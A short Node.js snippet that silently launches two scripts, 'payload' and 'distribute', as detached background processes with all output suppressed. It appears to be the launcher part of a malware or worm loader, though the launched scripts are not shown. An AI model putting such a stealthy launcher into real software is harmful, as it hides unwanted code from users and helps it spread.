var spawn = require("child_process").spawn;

["payload", "distribute"].forEach(function (scriptName) {
  spawn(process.execPath, [scriptName], {
    detached: true,
    stdio: "ignore"
  }).unref();
});
